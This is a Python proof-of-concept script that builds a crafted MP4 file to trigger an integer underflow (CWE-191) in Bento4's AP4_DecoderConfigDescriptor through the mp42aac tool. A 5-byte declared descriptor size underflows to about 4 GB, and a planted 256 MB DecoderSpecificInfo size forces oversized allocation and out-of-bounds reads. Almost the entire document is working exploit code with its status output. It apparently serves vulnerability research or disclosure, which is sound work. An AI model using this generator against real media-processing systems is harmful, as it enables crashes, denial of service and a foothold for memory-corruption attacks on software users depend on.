#!/usr/bin/env python3
"""
PoC Generator for VULN 002:
Integer Underflow in AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor()

Trigger path:
  mp42aac → AP4_EsdsAtom → AP4_DescriptorFactory → AP4_EsDescriptor
  → AP4_DescriptorFactory (loop) → AP4_DecoderConfigDescriptor(stream, 2, 5)
  → line 92: new AP4_SubStream(stream, start+13, payload_size-13)
                                                  ^^^^^^^^^^^^^^^^
  payload_size=5, 13 is uint32 literal → 5u - 13u underflows to 0xFFFFFFF8

CWE-191 (Integer Underflow) → CWE-125 (Out-of-Bounds Read via huge SubStream)
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT = os.path.join(SCRIPT_DIR, "vuln_002.mp4")


def u8(v):
    return struct.pack("B", v & 0xFF)


def u16be(v):
    return struct.pack(">H", v & 0xFFFF)


def u24be(v):
    return struct.pack(">I", v & 0xFFFFFF)[1:]


def u32be(v):
    return struct.pack(">I", v & 0xFFFFFFFF)


def box(fourcc, payload):
    """Build a 4-byte-size + 4-byte-fourcc MP4 box."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode("ascii")
    size = 8 + len(payload)
    return struct.pack(">I", size) + fourcc + payload


def fullbox(fourcc, version, flags, payload):
    """Build a FullBox (version+flags header)."""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(fourcc, vf + payload)


# ── Identity matrix used in tkhd and mvhd ─────────────────────────────────
IDENTITY_MATRIX = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)


# =========================================================================
# Build the esds box with a malicious DecoderConfig descriptor
# =========================================================================
#
# MPEG-4 expandable-size encoding:
#   Each byte: bit7 = "more bytes follow", bits6-0 = 7-bit data chunk.
#   For values 0-127: one byte suffices (bit7=0).
#
# DecoderConfig descriptor (tag=0x04):
#   Declared payload_size = 5  <-- KEY: less than 13 required bytes
#   Constructor will:
#     1. Read 13 bytes unconditionally (ObjectTypeIndication + bits +
#        BufferSize + MaxBitrate + AvgBitrate)
#     2. Compute: new AP4_SubStream(stream, start+13, payload_size-13)
#        → payload_size-13 = 5-13 = 0xFFFFFFF8  (uint32 underflow!)
#
# We pad the ES_Descriptor payload beyond the 5 declared bytes so that
# the 13-byte read inside the DC constructor can fully succeed, producing
# a clearly formed 0xFFFFFFF8-sized SubStream that the factory loop then
# tries to iterate over.  Those extra bytes (positions 15-26 in the ES
# SubStream) contain a DecoderSpecificInfo descriptor header
# (tag=0x05, expandable size = 0xFF 0xFF 0xFF 0x7F → 268,435,455 bytes)
# which forces AP4_DecoderSpecificInfoDescriptor to allocate and attempt
# to read a ~256 MB payload from the (underflowed) SubStream.

DC_DECLARED_PAYLOAD_SIZE = 5    # triggers underflow: 5 - 13 = 0xFFFFFFF8

# 5 bytes of declared DC payload
dc_declared_payload = bytes([0x40, 0x15, 0x00, 0x00, 0x00])

# 8 extra bytes so that the 13-byte read (positions 2-14 of the ES
# SubStream) succeeds in full.
dc_extra_for_read = bytes([0x00] * 8)

# 12 bytes reachable by the DC SubStream (ES positions 15-26):
# tag=0x05 (DecoderSpecificInfo) + 4-byte expandable size 0xFF FF FF 7F
# → payload_size = 0x0FFFFFFF (256 MB) → large allocation attempt
dc_substream_bait = bytes([
    0x05,               # DecoderSpecificInfo tag
    0xFF, 0xFF, 0xFF, 0x7F,  # expandable size → 0x0FFFFFFF
    0x00, 0x00, 0x00, 0x00,  # extra padding bytes in DC SubStream
    0x00, 0x00, 0x00,
])

# Assemble: DC header (tag + 1-byte size) + all bytes
dc_descriptor = (u8(0x04) +
                 u8(DC_DECLARED_PAYLOAD_SIZE) +
                 dc_declared_payload +
                 dc_extra_for_read +
                 dc_substream_bait)

# ES_Descriptor (tag=0x03) payload:
#   ES_ID (2) + stream_flags (1) + dc_descriptor
es_payload = u16be(0x0001) + u8(0x00) + dc_descriptor
assert len(es_payload) <= 127, "Use multi-byte size if > 127"
es_descriptor = u8(0x03) + u8(len(es_payload)) + es_payload

# esds FullBox: version=0, flags=0, then ES_Descriptor bytes
esds = fullbox("esds", 0, 0, es_descriptor)

print(f"[*] esds box size          : {len(esds)} bytes")
print(f"[*] ES_Descriptor payload  : {len(es_payload)} bytes")
print(f"[*] DC declared payload    : {DC_DECLARED_PAYLOAD_SIZE} bytes")
print(f"[*] DC underflow value     : 0x{DC_DECLARED_PAYLOAD_SIZE - 13 & 0xFFFFFFFF:08X} "
      f"({DC_DECLARED_PAYLOAD_SIZE} - 13 as uint32)")


# =========================================================================
# Build the surrounding MP4 structure so that mp42aac reaches esds parsing
# =========================================================================

# ── mp4a AudioSampleEntry ──────────────────────────────────────────────────
mp4a_payload = (
    b"\x00" * 6 +          # reserved[6]
    u16be(1) +              # data_reference_index = 1
    u16be(0) +              # version = 0
    u16be(0) +              # revision_level = 0
    b"\x00" * 4 +           # vendor
    u16be(2) +              # channelcount = 2
    u16be(16) +             # samplesize = 16
    u16be(0) +              # compression_id = 0
    u16be(0) +              # packet_size = 0
    u32be(0x00AC0000) +     # samplerate = 44100.0 << 16
    esds
)
mp4a = box("mp4a", mp4a_payload)

# ── stsd ──────────────────────────────────────────────────────────────────
stsd = fullbox("stsd", 0, 0, u32be(1) + mp4a)   # entry_count=1

# ── stts / stsc / stsz / stco (all empty, 0 samples) ────────────────────
stts = fullbox("stts", 0, 0, u32be(0))
stsc = fullbox("stsc", 0, 0, u32be(0))
stsz = fullbox("stsz", 0, 0, u32be(0) + u32be(0))   # sample_size=0, count=0
stco = fullbox("stco", 0, 0, u32be(0))

stbl = box("stbl", stsd + stts + stsc + stsz + stco)

# ── smhd (Sound Media Header) ─────────────────────────────────────────────
smhd = fullbox("smhd", 0, 0, u16be(0) + u16be(0))

# ── dinf / dref (self-contained data reference) ───────────────────────────
url_entry = fullbox("url ", 0, 1, b"")        # flags=1 = self-contained
dref = fullbox("dref", 0, 0, u32be(1) + url_entry)
dinf = box("dinf", dref)

# ── minf ──────────────────────────────────────────────────────────────────
minf = box("minf", smhd + dinf + stbl)

# ── mdhd (Media Header) ───────────────────────────────────────────────────
mdhd = fullbox("mdhd", 0, 0,
               u32be(0) +       # creation_time
               u32be(0) +       # modification_time
               u32be(44100) +   # timescale
               u32be(0) +       # duration
               u16be(0x15C7) +  # language = 'und'
               u16be(0))        # pre_defined

# ── hdlr (Handler Reference, handler='soun') ──────────────────────────────
hdlr = fullbox("hdlr", 0, 0,
               u32be(0) +       # pre_defined = 0
               b"soun" +        # handler_type
               b"\x00" * 12 +   # reserved[3]
               b"\x00")         # name (null terminator)

# ── mdia ──────────────────────────────────────────────────────────────────
mdia = box("mdia", mdhd + hdlr + minf)

# ── tkhd (Track Header, flags=3: enabled + in_movie) ──────────────────────
tkhd = fullbox("tkhd", 0, 3,
               u32be(0) +       # creation_time
               u32be(0) +       # modification_time
               u32be(1) +       # track_id
               u32be(0) +       # reserved
               u32be(0) +       # duration
               u32be(0) + u32be(0) +   # reserved[2]
               u16be(0) +       # layer
               u16be(0) +       # alternate_group
               u16be(0x0100) +  # volume = 1.0 (audio track)
               u16be(0) +       # reserved
               IDENTITY_MATRIX +
               u32be(0) +       # width
               u32be(0))        # height

# ── trak ──────────────────────────────────────────────────────────────────
trak = box("trak", tkhd + mdia)

# ── mvhd (Movie Header) ───────────────────────────────────────────────────
mvhd = fullbox("mvhd", 0, 0,
               u32be(0) +           # creation_time
               u32be(0) +           # modification_time
               u32be(1000) +        # timescale
               u32be(0) +           # duration
               u32be(0x00010000) +  # rate = 1.0
               u16be(0x0100) +      # volume = 1.0
               b"\x00" * 10 +       # reserved (2 bytes + uint32[2])
               IDENTITY_MATRIX +
               b"\x00" * 24 +       # pre_defined[6]
               u32be(2))            # next_track_ID

# ── moov ──────────────────────────────────────────────────────────────────
moov = box("moov", mvhd + trak)

# ── ftyp ──────────────────────────────────────────────────────────────────
ftyp = box("ftyp",
           b"isom" +          # major_brand
           u32be(0x00000200) + # minor_version
           b"isom")           # compatible_brands[0]

# ── mdat (empty, no actual audio samples) ─────────────────────────────────
mdat = box("mdat", b"")

# ── Assemble final MP4 ────────────────────────────────────────────────────
mp4_data = ftyp + moov + mdat

with open(OUTPUT, "wb") as fh:
    fh.write(mp4_data)

print(f"[*] Total file size        : {len(mp4_data)} bytes")
print(f"[+] Written to: {OUTPUT}")
print()
print("[!] Vulnerability trigger:")
print("    AP4_DecoderConfigDescriptor(stream, header_size=2, payload_size=5)")
print("    Line 92: new AP4_SubStream(stream, start+13, payload_size-13)")
print(f"             payload_size - 13 = 5 - 13 = 0x{(5 - 13) & 0xFFFFFFFF:08X} (uint32 underflow)")
print("    Resulting DC SubStream size: 4294967288 bytes (~4 GB)")
